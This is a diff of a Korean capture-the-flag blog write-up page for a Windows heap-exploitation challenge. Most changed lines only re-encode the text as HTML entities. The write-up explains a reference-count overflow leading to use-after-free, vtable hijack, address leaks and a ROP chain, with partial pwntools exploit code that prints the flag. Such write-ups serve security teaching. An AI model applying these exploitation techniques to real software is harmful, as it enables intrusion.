@@ -61,7 +61,7 @@
   <script src="/js/utils.js"></script>
   <script src="/js/color-schema.js"></script>
 
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
 </head>
 
 <body>
@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      1.6k 자
+      2.3k 자
     </span>
   
 
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      31
+      45
        분
     </span>
   
@@ -240,86 +240,86 @@
               <script>
                    (adsbygoogle = window.adsbygoogle || []).push({});
               </script>
-              <p>처음으로 낸 Windows 환경의 문제입니다..! 대회 당일날 시작과 동시에 공개된 문제이나 12시간이 되도록 솔버가 안나와서 solvable한 문제가 아닌가 대회 내내 걱정했던 친구이기도 하죠 ㅠㅠ</p>
-<p>idioth형이 대회 중간에 0솔버를 위한 선물이라고 짤을 하나 보내줬는데…</p>
+              <p>&#xCC98;&#xC74C;&#xC73C;&#xB85C; &#xB0B8; Windows &#xD658;&#xACBD;&#xC758; &#xBB38;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;..! &#xB300;&#xD68C; &#xB2F9;&#xC77C;&#xB0A0; &#xC2DC;&#xC791;&#xACFC; &#xB3D9;&#xC2DC;&#xC5D0; &#xACF5;&#xAC1C;&#xB41C; &#xBB38;&#xC81C;&#xC774;&#xB098; 12&#xC2DC;&#xAC04;&#xC774; &#xB418;&#xB3C4;&#xB85D; &#xC194;&#xBC84;&#xAC00; &#xC548;&#xB098;&#xC640;&#xC11C; solvable&#xD55C; &#xBB38;&#xC81C;&#xAC00; &#xC544;&#xB2CC;&#xAC00; &#xB300;&#xD68C; &#xB0B4;&#xB0B4; &#xAC71;&#xC815;&#xD588;&#xB358; &#xCE5C;&#xAD6C;&#xC774;&#xAE30;&#xB3C4; &#xD558;&#xC8E0; &#x3160;&#x3160;</p>
+<p>idioth&#xD615;&#xC774; &#xB300;&#xD68C; &#xC911;&#xAC04;&#xC5D0; 0&#xC194;&#xBC84;&#xB97C; &#xC704;&#xD55C; &#xC120;&#xBB3C;&#xC774;&#xB77C;&#xACE0; &#xC9E4;&#xC744; &#xD558;&#xB098; &#xBCF4;&#xB0B4;&#xC92C;&#xB294;&#xB370;&#x2026;</p>
 <p><img src="/2020/12/29/l0ch/address_book/1.png" srcset="/img/loading.gif"></p>
 <blockquote>
-<p>즌쯔… 느므 그믑느…^^</p>
+<p>&#xC98C;&#xCBD4;&#x2026; &#xB290;&#xBBC0; &#xADF8;&#xBBD1;&#xB290;&#x2026;^^</p>
 </blockquote>
-<p>그래도 대회 12시간만에 다행히 솔버가 나와서 다행이라고 생각합니다 ㅎㅎ.</p>
-<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>먼저, 문제 환경부터 보시죠</p>
+<p>&#xADF8;&#xB798;&#xB3C4; &#xB300;&#xD68C; 12&#xC2DC;&#xAC04;&#xB9CC;&#xC5D0; &#xB2E4;&#xD589;&#xD788; &#xC194;&#xBC84;&#xAC00; &#xB098;&#xC640;&#xC11C; &#xB2E4;&#xD589;&#xC774;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD569;&#xB2C8;&#xB2E4; &#x314E;&#x314E;.</p>
+<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>&#xBA3C;&#xC800;, &#xBB38;&#xC81C; &#xD658;&#xACBD;&#xBD80;&#xD130; &#xBCF4;&#xC2DC;&#xC8E0;</p>
 <blockquote>
 <p>Windows 64bit Version 10.0.19041.264 ASLR: True DEP: True SafeSEH: True Stack Cookie: True</p>
 </blockquote>
-<p>64bit 윈도우 10 환경이며, 보호기법은 모두 걸려있네요!</p>
-<p>어떤 기능들이 있는지 보겠습니다.</p>
+<p>64bit &#xC708;&#xB3C4;&#xC6B0; 10 &#xD658;&#xACBD;&#xC774;&#xBA70;, &#xBCF4;&#xD638;&#xAE30;&#xBC95;&#xC740; &#xBAA8;&#xB450; &#xAC78;&#xB824;&#xC788;&#xB124;&#xC694;!</p>
+<p>&#xC5B4;&#xB5A4; &#xAE30;&#xB2A5;&#xB4E4;&#xC774; &#xC788;&#xB294;&#xC9C0; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <p><img src="/2020/12/29/l0ch/address_book/2.png" srcset="/img/loading.gif"></p>
 <ol>
 <li><p>Add address Info</p>
-<p>name, address, city를 입력받고 address info를 추가</p>
+<p>name, address, city&#xB97C; &#xC785;&#xB825;&#xBC1B;&#xACE0; address info&#xB97C; &#xCD94;&#xAC00;</p>
 </li>
 <li><p>Address Info List</p>
-<p>추가한 address info들을 출력</p>
+<p>&#xCD94;&#xAC00;&#xD55C; address info&#xB4E4;&#xC744; &#xCD9C;&#xB825;</p>
 </li>
 <li><p>Delete address Info</p>
-<p>address info를 삭제. 이 때 삭제된 info는 Recycle Bin List에 추가</p>
+<p>address info&#xB97C; &#xC0AD;&#xC81C;. &#xC774; &#xB54C; &#xC0AD;&#xC81C;&#xB41C; info&#xB294; Recycle Bin List&#xC5D0; &#xCD94;&#xAC00;</p>
 </li>
 <li><p>Restore address Info</p>
-<p>삭제된 info를 원래 List로 복구</p>
+<p>&#xC0AD;&#xC81C;&#xB41C; info&#xB97C; &#xC6D0;&#xB798; List&#xB85C; &#xBCF5;&#xAD6C;</p>
 </li>
 <li><p>Modify address Info</p>
-<p>수정할 address info를 선택해 name, address, city를 수정 가능</p>
+<p>&#xC218;&#xC815;&#xD560; address info&#xB97C; &#xC120;&#xD0DD;&#xD574; name, address, city&#xB97C; &#xC218;&#xC815; &#xAC00;&#xB2A5;</p>
 </li>
 <li><p>Empty List</p>
-<p>address list와 recycle bin list 항목을 모두 삭제</p>
+<p>address list&#xC640; recycle bin list &#xD56D;&#xBAA9;&#xC744; &#xBAA8;&#xB450; &#xC0AD;&#xC81C;</p>
 </li>
 <li><p>Exit</p>
 </li>
 </ol>
-<p>7번으로 종료하면</p>
+<p>7&#xBC88;&#xC73C;&#xB85C; &#xC885;&#xB8CC;&#xD558;&#xBA74;</p>
 <p><img src="/2020/12/29/l0ch/address_book/3.png" srcset="/img/loading.gif"></p>
-<p>list가 저장되었다고 뜨는데, 옆에 메모리 주소로 보이는 값이 존재합니다.</p>
-<p>리스트는 double linked list로 구현되어 있으며 처음에 <code>Address Book</code>, <code>Recycle Bin</code> 두개의 객체가 할당되어 각각 2byte 정수 type의 reference count (초기값=10)를 가집니다. 함수가 객체를 참조할 때 count가 10 올라가며 해당 함수를 빠져나올때 count가 10 감소하고 10보다 작으면 할당된 객체를 free하고 객체의 주소를 출력합니다.</p>
-<p>감이 오시죠. C++의 공유포인터 <code>std::shared_ptr</code> 를 커스텀 구현한 문제입니다.</p>
-<h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p><code>Recycle Bin</code>의 info를 restore할때 복구하는 노드에서, <code>Recycle Bin</code>에서 사용한 next 값이 초기화되지 않고 남아있습니다.</p>
-<p><img src="/2020/12/29/l0ch/address_book/4.png" srcset="/img/loading.gif"><br>노드를 네 개 생성한 뒤 4, 3을 차례대로 삭제하면 Recycle Bin 리스트에 순서대로 들어갑니다.</p>
+<p>list&#xAC00; &#xC800;&#xC7A5;&#xB418;&#xC5C8;&#xB2E4;&#xACE0; &#xB728;&#xB294;&#xB370;, &#xC606;&#xC5D0; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xB85C; &#xBCF4;&#xC774;&#xB294; &#xAC12;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p>
+<p>&#xB9AC;&#xC2A4;&#xD2B8;&#xB294; double linked list&#xB85C; &#xAD6C;&#xD604;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA70; &#xCC98;&#xC74C;&#xC5D0; <code>Address Book</code>, <code>Recycle Bin</code> &#xB450;&#xAC1C;&#xC758; &#xAC1D;&#xCCB4;&#xAC00; &#xD560;&#xB2F9;&#xB418;&#xC5B4; &#xAC01;&#xAC01; 2byte &#xC815;&#xC218; type&#xC758; reference count (&#xCD08;&#xAE30;&#xAC12;=10)&#xB97C; &#xAC00;&#xC9D1;&#xB2C8;&#xB2E4;. &#xD568;&#xC218;&#xAC00; &#xAC1D;&#xCCB4;&#xB97C; &#xCC38;&#xC870;&#xD560; &#xB54C; count&#xAC00; 10 &#xC62C;&#xB77C;&#xAC00;&#xBA70; &#xD574;&#xB2F9; &#xD568;&#xC218;&#xB97C; &#xBE60;&#xC838;&#xB098;&#xC62C;&#xB54C; count&#xAC00; 10 &#xAC10;&#xC18C;&#xD558;&#xACE0; 10&#xBCF4;&#xB2E4; &#xC791;&#xC73C;&#xBA74; &#xD560;&#xB2F9;&#xB41C; &#xAC1D;&#xCCB4;&#xB97C; free&#xD558;&#xACE0; &#xAC1D;&#xCCB4;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xCD9C;&#xB825;&#xD569;&#xB2C8;&#xB2E4;.</p>
+<p>&#xAC10;&#xC774; &#xC624;&#xC2DC;&#xC8E0;. C++&#xC758; &#xACF5;&#xC720;&#xD3EC;&#xC778;&#xD130; <code>std::shared_ptr</code> &#xB97C; &#xCEE4;&#xC2A4;&#xD140; &#xAD6C;&#xD604;&#xD55C; &#xBB38;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;.</p>
+<h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p><code>Recycle Bin</code>&#xC758; info&#xB97C; restore&#xD560;&#xB54C; &#xBCF5;&#xAD6C;&#xD558;&#xB294; &#xB178;&#xB4DC;&#xC5D0;&#xC11C;, <code>Recycle Bin</code>&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD55C; next &#xAC12;&#xC774; &#xCD08;&#xAE30;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xACE0; &#xB0A8;&#xC544;&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
+<p><img src="/2020/12/29/l0ch/address_book/4.png" srcset="/img/loading.gif"><br>&#xB178;&#xB4DC;&#xB97C; &#xB124; &#xAC1C; &#xC0DD;&#xC131;&#xD55C; &#xB4A4; 4, 3&#xC744; &#xCC28;&#xB840;&#xB300;&#xB85C; &#xC0AD;&#xC81C;&#xD558;&#xBA74; Recycle Bin &#xB9AC;&#xC2A4;&#xD2B8;&#xC5D0; &#xC21C;&#xC11C;&#xB300;&#xB85C; &#xB4E4;&#xC5B4;&#xAC11;&#xB2C8;&#xB2E4;.</p>
 <p><img src="/2020/12/29/l0ch/address_book/5.png" srcset="/img/loading.gif"></p>
-<p>Restore 4로 <code>Address List</code>로 복구했을때 node 4의 next 가 초기화되지 않고 여전히 <code>Recycle Bin</code>의 3을 가리킵니다.</p>
+<p>Restore 4&#xB85C; <code>Address List</code>&#xB85C; &#xBCF5;&#xAD6C;&#xD588;&#xC744;&#xB54C; node 4&#xC758; next &#xAC00; &#xCD08;&#xAE30;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xACE0; &#xC5EC;&#xC804;&#xD788; <code>Recycle Bin</code>&#xC758; 3&#xC744; &#xAC00;&#xB9AC;&#xD0B5;&#xB2C8;&#xB2E4;.</p>
 <p><img src="/2020/12/29/l0ch/address_book/6.png" srcset="/img/loading.gif"></p>
-<p>Restore 3을 하면 <code>Address List</code>에 index 순서에 맞게 2와 4 사이에 삽입되고 결과적으로 다음과 같이 3과 4의 next가 각각 서로를 가리키게 되어 순환적인 구조를 가진 리스트를 만들 수 있습니다.</p>
-<p><code>Address List</code>의 노드들을 출력하는 함수는 노드의 next가 NULL일때까지 혹은 입력한 수만큼 재귀호출을 통해 head 노드부터 출력합니다. 이때 입력한 수를 검증하지 않아 reference counter의  integer overflow가 발생할 수 있습니다.</p>
-<p><img src="/2020/12/29/l0ch/address_book/7.png" srcset="/img/loading.gif"><br>재귀함수의 인자로 <code>Address List</code>의 포인터가 들어가는데, 재귀함수가 한 번 호출될때마다 <code>Address List</code>의 reference count가 10씩 증가합니다. </p>
-<p>위와 같이 취약점을 트리거했을 때 정확히 3275만큼 재귀로 참조하면 2byte 정수 조건을 벗어나게 되어 free 조건인 <code>reference count &lt; 10</code> 을 만족하게 되고 AddressBook 포인터가 한 번 free됩니다.  </p>
-<p>이어 Add Address Info에서 노드를 새로 할당하는 것으로 UAF를 트리거할 수 있어 Address Info에서 <code>name</code> 으로 vtable 을 overwrite 해 eip control이 가능합니다.</p>
-<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p>바이너리에서 <code>flag.txt</code>를 open했으니 <code>read</code>와 <code>write</code>로 flag 내용을 출력하기만 하면 됩니다.</p>
+<p>Restore 3&#xC744; &#xD558;&#xBA74; <code>Address List</code>&#xC5D0; index &#xC21C;&#xC11C;&#xC5D0; &#xB9DE;&#xAC8C; 2&#xC640; 4 &#xC0AC;&#xC774;&#xC5D0; &#xC0BD;&#xC785;&#xB418;&#xACE0; &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; 3&#xACFC; 4&#xC758; next&#xAC00; &#xAC01;&#xAC01; &#xC11C;&#xB85C;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xAC8C; &#xB418;&#xC5B4; &#xC21C;&#xD658;&#xC801;&#xC778; &#xAD6C;&#xC870;&#xB97C; &#xAC00;&#xC9C4; &#xB9AC;&#xC2A4;&#xD2B8;&#xB97C; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
+<p><code>Address List</code>&#xC758; &#xB178;&#xB4DC;&#xB4E4;&#xC744; &#xCD9C;&#xB825;&#xD558;&#xB294; &#xD568;&#xC218;&#xB294; &#xB178;&#xB4DC;&#xC758; next&#xAC00; NULL&#xC77C;&#xB54C;&#xAE4C;&#xC9C0; &#xD639;&#xC740; &#xC785;&#xB825;&#xD55C; &#xC218;&#xB9CC;&#xD07C; &#xC7AC;&#xADC0;&#xD638;&#xCD9C;&#xC744; &#xD1B5;&#xD574; head &#xB178;&#xB4DC;&#xBD80;&#xD130; &#xCD9C;&#xB825;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; &#xC785;&#xB825;&#xD55C; &#xC218;&#xB97C; &#xAC80;&#xC99D;&#xD558;&#xC9C0; &#xC54A;&#xC544; reference counter&#xC758;  integer overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
+<p><img src="/2020/12/29/l0ch/address_book/7.png" srcset="/img/loading.gif"><br>&#xC7AC;&#xADC0;&#xD568;&#xC218;&#xC758; &#xC778;&#xC790;&#xB85C; <code>Address List</code>&#xC758; &#xD3EC;&#xC778;&#xD130;&#xAC00; &#xB4E4;&#xC5B4;&#xAC00;&#xB294;&#xB370;, &#xC7AC;&#xADC0;&#xD568;&#xC218;&#xAC00; &#xD55C; &#xBC88; &#xD638;&#xCD9C;&#xB420;&#xB54C;&#xB9C8;&#xB2E4; <code>Address List</code>&#xC758; reference count&#xAC00; 10&#xC529; &#xC99D;&#xAC00;&#xD569;&#xB2C8;&#xB2E4;. </p>
+<p>&#xC704;&#xC640; &#xAC19;&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD588;&#xC744; &#xB54C; &#xC815;&#xD655;&#xD788; 3275&#xB9CC;&#xD07C; &#xC7AC;&#xADC0;&#xB85C; &#xCC38;&#xC870;&#xD558;&#xBA74; 2byte &#xC815;&#xC218; &#xC870;&#xAC74;&#xC744; &#xBC97;&#xC5B4;&#xB098;&#xAC8C; &#xB418;&#xC5B4; free &#xC870;&#xAC74;&#xC778; <code>reference count &lt; 10</code> &#xC744; &#xB9CC;&#xC871;&#xD558;&#xAC8C; &#xB418;&#xACE0; AddressBook &#xD3EC;&#xC778;&#xD130;&#xAC00; &#xD55C; &#xBC88; free&#xB429;&#xB2C8;&#xB2E4;.  </p>
+<p>&#xC774;&#xC5B4; Add Address Info&#xC5D0;&#xC11C; &#xB178;&#xB4DC;&#xB97C; &#xC0C8;&#xB85C; &#xD560;&#xB2F9;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; UAF&#xB97C; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xC5B4; Address Info&#xC5D0;&#xC11C; <code>name</code> &#xC73C;&#xB85C; vtable &#xC744; overwrite &#xD574; eip control&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p>
+<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p>&#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0;&#xC11C; <code>flag.txt</code>&#xB97C; open&#xD588;&#xC73C;&#xB2C8; <code>read</code>&#xC640; <code>write</code>&#xB85C; flag &#xB0B4;&#xC6A9;&#xC744; &#xCD9C;&#xB825;&#xD558;&#xAE30;&#xB9CC; &#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs c">read(<span class="hljs-number">3</span>, buffer, <span class="hljs-keyword">sizeof</span>(flag))  <span class="hljs-comment">// 3 : file descriptor</span>
 write(<span class="hljs-number">1</span>, buffer, <span class="hljs-keyword">sizeof</span>(flag))</code></pre>
 
-<p>ROP에 필요한 건 다음과 같습니다.</p>
-<p><code>ntdll.dll</code> base address → gadget</p>
-<p><code>ucrtbase.dll</code> base address → <code>read</code>, <code>write</code></p>
-<p>위 주소들을 구하기 위해서 먼저 바이너리의 imagebase부터 leak해야 합니다.</p>
-<p>UAF 이후 leak은 Address Info를 출력할 때 <code>head</code> 포인터 값에서부터 참조하는 것을 이용해 Address Info의 <code>city+16</code> 에서 <code>head</code> 포인터를 overwrite → OOB read가 가능한 점을 이용합니다.</p>
+<p>ROP&#xC5D0; &#xD544;&#xC694;&#xD55C; &#xAC74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
+<p><code>ntdll.dll</code> base address &#x2192; gadget</p>
+<p><code>ucrtbase.dll</code> base address &#x2192; <code>read</code>, <code>write</code></p>
+<p>&#xC704; &#xC8FC;&#xC18C;&#xB4E4;&#xC744; &#xAD6C;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C; &#xBA3C;&#xC800; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC758; imagebase&#xBD80;&#xD130; leak&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p>
+<p>UAF &#xC774;&#xD6C4; leak&#xC740; Address Info&#xB97C; &#xCD9C;&#xB825;&#xD560; &#xB54C; <code>head</code> &#xD3EC;&#xC778;&#xD130; &#xAC12;&#xC5D0;&#xC11C;&#xBD80;&#xD130; &#xCC38;&#xC870;&#xD558;&#xB294; &#xAC83;&#xC744; &#xC774;&#xC6A9;&#xD574; Address Info&#xC758; <code>city+16</code> &#xC5D0;&#xC11C; <code>head</code> &#xD3EC;&#xC778;&#xD130;&#xB97C; overwrite &#x2192; OOB read&#xAC00; &#xAC00;&#xB2A5;&#xD55C; &#xC810;&#xC744; &#xC774;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p>
 <p><img src="/2020/12/29/l0ch/address_book/8.png" srcset="/img/loading.gif"></p>
-<p>몇번 실행해보면 객체간 offset 에 패턴이 있습니다. offset을 계산해서 city+16 에 Recycle Bin의 주소로 head 를 overwrite하고 2번 메뉴로 출력하면 vtable 주소를 구할 수 있습니다.</p>
+<p>&#xBA87;&#xBC88; &#xC2E4;&#xD589;&#xD574;&#xBCF4;&#xBA74; &#xAC1D;&#xCCB4;&#xAC04; offset &#xC5D0; &#xD328;&#xD134;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. offset&#xC744; &#xACC4;&#xC0B0;&#xD574;&#xC11C; city+16 &#xC5D0; Recycle Bin&#xC758; &#xC8FC;&#xC18C;&#xB85C; head &#xB97C; overwrite&#xD558;&#xACE0; 2&#xBC88; &#xBA54;&#xB274;&#xB85C; &#xCD9C;&#xB825;&#xD558;&#xBA74; vtable &#xC8FC;&#xC18C;&#xB97C; &#xAD6C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <p><img src="/2020/12/29/l0ch/address_book/9.png" srcset="/img/loading.gif"></p>
-<p><code>Recycle Bin</code>의 vtable offset은 0x6960이니 leak한 vtable에 offset만큼 빼면 imagebase가 나오겠군요!</p>
-<p>이제 imagebase를 구했으니 dll 주소를 구하는건 쉽습니다!</p>
-<p>구하고싶은 dll의 아무 함수나 IAT 테이블에서 offset을 찾고, imagebase+offset 주소에 존재하는 dll 함수 주소를 leak하면 되죠. <code>ntdll</code>부터 구해보겠습니다.</p>
+<p><code>Recycle Bin</code>&#xC758; vtable offset&#xC740; 0x6960&#xC774;&#xB2C8; leak&#xD55C; vtable&#xC5D0; offset&#xB9CC;&#xD07C; &#xBE7C;&#xBA74; imagebase&#xAC00; &#xB098;&#xC624;&#xACA0;&#xAD70;&#xC694;!</p>
+<p>&#xC774;&#xC81C; imagebase&#xB97C; &#xAD6C;&#xD588;&#xC73C;&#xB2C8; dll &#xC8FC;&#xC18C;&#xB97C; &#xAD6C;&#xD558;&#xB294;&#xAC74; &#xC27D;&#xC2B5;&#xB2C8;&#xB2E4;!</p>
+<p>&#xAD6C;&#xD558;&#xACE0;&#xC2F6;&#xC740; dll&#xC758; &#xC544;&#xBB34; &#xD568;&#xC218;&#xB098; IAT &#xD14C;&#xC774;&#xBE14;&#xC5D0;&#xC11C; offset&#xC744; &#xCC3E;&#xACE0;, imagebase+offset &#xC8FC;&#xC18C;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; dll &#xD568;&#xC218; &#xC8FC;&#xC18C;&#xB97C; leak&#xD558;&#xBA74; &#xB418;&#xC8E0;. <code>ntdll</code>&#xBD80;&#xD130; &#xAD6C;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <p><img src="/2020/12/29/l0ch/address_book/10.png" srcset="/img/loading.gif"></p>
-<p><code>!dh imagebase</code> 로 IAT offset을 찾고 Import된 dll 함수를 찾아볼게요</p>
+<p><code>!dh imagebase</code> &#xB85C; IAT offset&#xC744; &#xCC3E;&#xACE0; Import&#xB41C; dll &#xD568;&#xC218;&#xB97C; &#xCC3E;&#xC544;&#xBCFC;&#xAC8C;&#xC694;</p>
 <p><img src="/2020/12/29/l0ch/address_book/11.png" srcset="/img/loading.gif"></p>
-<p><code>ntdll!RtlInitializeSListHead</code> 가 imagebase+ 0x6060에 있네요.</p>
-<p><code>ucrtbase!free</code> 도 imagebase + 0x61f0 인걸 확인할 수 있습니다.</p>
-<p>vtable을 leak했을 때와 같은 방법으로 <code>head</code>를 overwrite해 해당 메모리에 있는 값을 출력하고 각각 dll 내 offset을 빼주면 dll base address를 구할 수 있습니다!</p>
-<h2 id="imagebase-dll-leak"><a href="#imagebase-dll-leak" class="headerlink" title="imagebase/dll leak"></a>imagebase/dll leak</h2><pre><code class="hljs python"><span class="hljs-comment"># 전체 코드는 아래 Exploit Code 참조</span>
+<p><code>ntdll!RtlInitializeSListHead</code> &#xAC00; imagebase+ 0x6060&#xC5D0; &#xC788;&#xB124;&#xC694;.</p>
+<p><code>ucrtbase!free</code> &#xB3C4; imagebase + 0x61f0 &#xC778;&#xAC78; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
+<p>vtable&#xC744; leak&#xD588;&#xC744; &#xB54C;&#xC640; &#xAC19;&#xC740; &#xBC29;&#xBC95;&#xC73C;&#xB85C; <code>head</code>&#xB97C; overwrite&#xD574; &#xD574;&#xB2F9; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC788;&#xB294; &#xAC12;&#xC744; &#xCD9C;&#xB825;&#xD558;&#xACE0; &#xAC01;&#xAC01; dll &#xB0B4; offset&#xC744; &#xBE7C;&#xC8FC;&#xBA74; dll base address&#xB97C; &#xAD6C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p>
+<h2 id="imagebase-dll-leak"><a href="#imagebase-dll-leak" class="headerlink" title="imagebase/dll leak"></a>imagebase/dll leak</h2><pre><code class="hljs python"><span class="hljs-comment"># &#xC804;&#xCCB4; &#xCF54;&#xB4DC;&#xB294; &#xC544;&#xB798; Exploit Code &#xCC38;&#xC870;</span>
 <span class="hljs-comment"># get heap address</span>
 p.recvuntil(<span class="hljs-string">&quot;saved in &quot;</span>)
 obj_leak = int(p.recvuntil(<span class="hljs-string">&quot;\\r\\n&quot;</span>),<span class="hljs-number">16</span>)
 print(obj_leak)
 
 <span class="hljs-comment"># allocation after addressbook free</span>
-<span class="hljs-comment"># overwrite addressbook-&gt;head to recyclebin, get recyclebin&#x27;s vtable</span>
+<span class="hljs-comment"># overwrite addressbook-&gt;head to recyclebin, get recyclebin&apos;s vtable</span>
 <span class="hljs-comment"># not reliable leak, but address not changed before reboot</span>
 context.log_level = <span class="hljs-string">&quot;debug&quot;</span>
 
@@ -352,29 +352,29 @@ ucrtbase = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-stri
 print(<span class="hljs-string">&quot;image base : &quot;</span>+hex(imagebase))
 print(<span class="hljs-string">&quot;ntdll base : &quot;</span>+hex(ntdll))
 print(<span class="hljs-string">&quot;ucrtbase base : &quot;</span>+hex(ucrtbase))
-p.recvuntil(<span class="hljs-string">&#x27;&gt;&#x27;</span>)</code></pre>
+p.recvuntil(<span class="hljs-string">&apos;&gt;&apos;</span>)</code></pre>
 
 
 
 <p><img src="/2020/12/29/l0ch/address_book/12.png" srcset="/img/loading.gif"></p>
-<p>이제 필요한 주소들도 모두 구했고 eip도 컨트롤할 수 있으니, ROP chain만 구성하면 됩니다.</p>
-<p><code>mov rsp, [rcx+152]; mov rcx, [rcx+248]; jmp rcx;</code> 로 rsp를 현재 페이로드가 올라와 있는 주소로 pivot 한뒤 <code>read</code>, <code>write</code>를 차례로 호출하면 flag를 출력할 수 있습니다!</p>
+<p>&#xC774;&#xC81C; &#xD544;&#xC694;&#xD55C; &#xC8FC;&#xC18C;&#xB4E4;&#xB3C4; &#xBAA8;&#xB450; &#xAD6C;&#xD588;&#xACE0; eip&#xB3C4; &#xCEE8;&#xD2B8;&#xB864;&#xD560; &#xC218; &#xC788;&#xC73C;&#xB2C8;, ROP chain&#xB9CC; &#xAD6C;&#xC131;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p>
+<p><code>mov rsp, [rcx+152]; mov rcx, [rcx+248]; jmp rcx;</code> &#xB85C; rsp&#xB97C; &#xD604;&#xC7AC; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xAC00; &#xC62C;&#xB77C;&#xC640; &#xC788;&#xB294; &#xC8FC;&#xC18C;&#xB85C; pivot &#xD55C;&#xB4A4; <code>read</code>, <code>write</code>&#xB97C; &#xCC28;&#xB840;&#xB85C; &#xD638;&#xCD9C;&#xD558;&#xBA74; flag&#xB97C; &#xCD9C;&#xB825;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p>
 <p><img src="/2020/12/29/l0ch/address_book/13.png" srcset="/img/loading.gif"></p>
 <h2 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h2><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
 
 <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">addAddr</span>(<span class="hljs-params">name, address, city</span>):</span>
 	p.sendline(<span class="hljs-string">&quot;1&quot;</span>)
-	print(p.recvuntil(<span class="hljs-string">&#x27;:&#x27;</span>))
+	print(p.recvuntil(<span class="hljs-string">&apos;:&apos;</span>))
 	p.sendline(name)
-	print(p.recvuntil(<span class="hljs-string">&#x27;:&#x27;</span>))
+	print(p.recvuntil(<span class="hljs-string">&apos;:&apos;</span>))
 	p.sendline(address)
-	print(p.recvuntil(<span class="hljs-string">&#x27;:&#x27;</span>))
+	print(p.recvuntil(<span class="hljs-string">&apos;:&apos;</span>))
 	p.sendline(city)
-	print(p.recvuntil(<span class="hljs-string">&#x27;&gt;&#x27;</span>))	
+	print(p.recvuntil(<span class="hljs-string">&apos;&gt;&apos;</span>))	
 
 <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">listAddr</span>(<span class="hljs-params">idx</span>):</span>
 	p.sendline(<span class="hljs-string">&quot;2&quot;</span>)
-	print(p.recvuntil(<span class="hljs-string">&#x27;&gt;&#x27;</span>))	
+	print(p.recvuntil(<span class="hljs-string">&apos;&gt;&apos;</span>))	
 	p.sendline(str(idx))
 
 <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">deleteAddr</span>(<span class="hljs-params">idx</span>):</span>
@@ -428,7 +428,7 @@ obj_leak = int(p.recvuntil(<span class="hljs-string">&quot;\\r\\n&quot;</span>),
 print(obj_leak)
 
 <span class="hljs-comment"># allocation after addressbook free</span>
-<span class="hljs-comment"># overwrite addressbook-&gt;head to recyclebin, get recyclebin&#x27;s vtable</span>
